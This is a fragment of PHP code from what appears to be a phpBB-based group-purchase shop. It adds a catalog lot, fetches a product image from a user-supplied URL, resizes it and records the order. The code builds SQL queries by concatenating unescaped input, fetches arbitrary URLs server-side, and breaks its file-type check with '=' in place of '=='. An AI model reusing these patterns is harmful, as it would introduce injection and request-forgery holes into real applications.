			elseif (isset($_POST['edit_img_00'])&&($_POST['edit_img_00'] <>'')){ // URL для загрузки картинки
				$img=trim($_POST['edit_img_00']);
				$sql="SELECT brand_id FROM phpbb_catalogs LEFT OUTER JOIN phpbb_purchases ON phpbb_catalogs.purchase_id = phpbb_purchases.purchase_id LEFT OUTER JOIN phpbb_reservs
						ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id WHERE phpbb_catalogs.catalog_id =".$catalog_id;
				$result = $db->sql_query($sql);
				$row = $db->sql_fetchrow($result);
				$brand_id= $row['brand_id']; 	
				$type=get_headers($img, 1);
				$type=$type['Content-Type'];

				$path_to_save ='images/lots/'.$brand_id;
				$thumb_path_to_save ='images/lots/thumb/'.$brand_id;
				if (!file_exists($path_to_save)){
					mkdir($path_to_save);
				}
				if (!file_exists($thumb_path_to_save)){
					mkdir($thumb_path_to_save);
				}
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL,$img);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
				curl_setopt($ch, CURLOPT_BINARYTRANSFER,1);  
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208');
				
				$out = curl_exec($ch);
				curl_close($ch);
				$filename=hash("md5",$out);

				if ($type = 'image/jpeg') $filename.='.jpg';
				elseif ($type = 'image/gif') $filename.='.gif';
				elseif ($type = 'image/png') $filename.='.png';
				else {
					$arr = array ('result'=>"err");
					exit (json_encode($arr));
				}
				$imgname=$path_to_save.'/'.$filename;
				$thumbname=$thumb_path_to_save.'/'.$filename;
				$lot_img=$brand_id.'/'.$filename;
				
				if ($filename){
					$img_sc = file_put_contents($imgname, $out);  
				//	echo ($filename." ".$img_sc."!<br>");
					
					img_resize($imgname,$imgname, 400, 400);
					chmod($imgname,0644);
					
					img_resize($imgname,$thumbname, 160, 240);
					chmod($thumbname,0644);
					$url = array($lot_img);
				}
				else{
					$url = '';
				}
			}
			else {
				$url='';
			}
			if ($_POST['edit_price_00']=='')
				$edit_price=0;
			else 
				$edit_price=$_POST['edit_price_00'];
			// Добавляем лот
			$sql = 'INSERT 
				INTO '.LOTS_TABLE.' 
				(catalog_id,lot_name,lot_properties,lot_cost,lot_article,lot_description,lot_orgrate,lot_img )
				VALUES (
					'. $catalog_id .',
					\''.$db->sql_escape(('(new) '.$_POST['edit_name_00'])).'\',
					\''.serialize($item["vars"]).'\',
					\''.str_replace(',','.',$edit_price).'\',
					\''.str_replace(',','.',$db->sql_escape($_POST['edit_article_00'])).'\',
					\''.$db->sql_escape(addslashes($_POST['edit_desc_00'])).'\',
					\''.$item["org_fee"].'\',
					\''.serialize($url).'\'
				)';
			$db->sql_query($sql);
			// Получаем ID последнего INSERT
			$result = $db->sql_query("SELECT LAST_INSERT_ID() as lot_id");
			$row = $db->sql_fetchrow($result);

			$lot_id= $row['lot_id']; 

			$db->sql_freeresult();
			// Получаем ID дакупки
			$sql = 'SELECT purchase_id, catalog_valuta, catalog_course,
						IF (phpbb_lots.lot_orgrate IS NULL ,phpbb_catalogs.catalog_orgrate,phpbb_lots.lot_orgrate) AS lot_orgrate, lot_cost
					FROM phpbb_lots LEFT OUTER JOIN phpbb_catalogs  ON phpbb_lots.catalog_id = phpbb_catalogs.catalog_id WHERE
					phpbb_lots.lot_id ='.$lot_id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$purchase_id= $row['purchase_id']; 
			$catalog_valuta= $row['catalog_valuta']; 
			$catalog_course= $row['catalog_course']; 
			$lot_orgrate= $row['lot_orgrate']; 
			$lot_cost= $row['lot_cost']; 

			// Вставляем заказа в Orders

			$sql = 'INSERT INTO '.ORDERS_TABLE.'
				(user_id,purchase_id,lot_id,order_properties,lot_cost,lot_orgrate,catalog_valuta,catalog_course )
				VALUES ('.$user->data['user_id'].','.$purchase_id.','.$lot_id.',\''.serialize($item["vars"]).'\','.$lot_cost.','.$lot_orgrate.',\''.$catalog_valuta.'\','.$catalog_course. ')';
			$db->sql_query($sql);
			$sql = 'SELECT *
				FROM '.PURCHASES_TABLE.'
				JOIN '. CATALOGS_TABLE .'
					ON '. PURCHASES_TABLE .'.purchase_id = '. CATALOGS_TABLE .'.purchase_id
				JOIN '. LOTS_TABLE .'
					ON '. LOTS_TABLE .'.catalog_id = '. CATALOGS_TABLE .'.catalog_id
				WHERE '. LOTS_TABLE .'.lot_id ='.$lot_id;

			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$purchase_id= $row['purchase_id']; 
			// проверяем запись в PURCHASES_ORSERS
			$sql = 'SELECT *
				FROM '.PURCHASES_ORSERS_TABLE.'
				WHERE purchase_id ='.$purchase_id.'
					AND user_id='.$user->data['user_id'];
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			// Если ее нет, то добавляем
			if ($row==''){
			$sql = 'INSERT INTO '.PURCHASES_ORSERS_TABLE.'
				(user_id,purchase_id)
				VALUES ('.$user->data['user_id'].','.$purchase_id.')';
			$result = $db->sql_query($sql);
			}
			else {// Если оплата есть, то вытаскиваем корзину с архива
				$sql ='UPDATE phpbb_purchases_orsers SET puor_arhiv = 0 
						WHERE purchase_id = '.$purchase_id.'
						AND user_id ='.$user->data['user_id'];
				$result = $db->sql_query($sql);
			}	
			$arr= array(
				res => 'ok',
				id	=>	$lot_id
			);
			echo json_encode($arr);
			break;
		
	}
}
/***********************************************************************************
Функция img_resize(): генерация thumbnails
Параметры:
  $src             - имя исходного файла
  $dest            - имя генерируемого файла
  $width, $height  - ширина и высота генерируемого изображения, в пикселях
Необязательные параметры:
  $rgb             - цвет фона, по умолчанию - белый
  $quality         - качество генерируемого JPEG, по умолчанию - максимальное (100)
***********************************************************************************/ 
function img_resize($src, $dest, $width, $height, $rgb=0xFFFFFF, $quality=100, $max=false)
{
  if (!file_exists($src)) return false;
 
  $size = getimagesize($src);
 
  if ($size === false) return false;
 
  // Определяем исходный формат по MIME-информации, предоставленной
  // функцией getimagesize, и выбираем соответствующую формату
  // imagecreatefrom-функцию.
  $format = strtolower(substr($size['mime'], strpos($size['mime'], '/')+1));
  $icfunc = "imagecreatefrom" . $format;
  if (!function_exists($icfunc)) return false;
 
  $x_ratio = $width  / $size[0];
  $y_ratio = $height / $size[1];

  $ratio       = min($x_ratio, $y_ratio);
  $use_x_ratio = ($x_ratio == $ratio);
 
  if (!$max){
	$ratio = $ratio>1 ? 1 : $ratio;
  }
 
  $new_width   = floor($size[0] * $ratio);
  $new_height  = floor($size[1] * $ratio);
  $new_left    = $use_x_ratio  ? 0 : floor(($width - $new_width) / 2);
  $new_top     = !$use_x_ratio ? 0 : floor(($height - $new_height) / 2);
 
  $isrc = $icfunc($src);
//  $idest = imagecreatetruecolor($width, $height);
  $idest = imagecreatetruecolor($new_width, $new_height);
 
  imagefill($idest, 0, 0, $rgb);
//  imagecopyresampled($idest, $isrc, $new_left, $new_top, 0, 0,  
//    $new_width, $new_height, $size[0], $size[1]);
  imagecopyresampled($idest, $isrc, 0, 0, 0, 0,  
    $new_width, $new_height, $size[0], $size[1]);
 
  imagejpeg($idest, $dest, $quality);
 
  imagedestroy($isrc);
  imagedestroy($idest);
 
  return true;
 
}
?>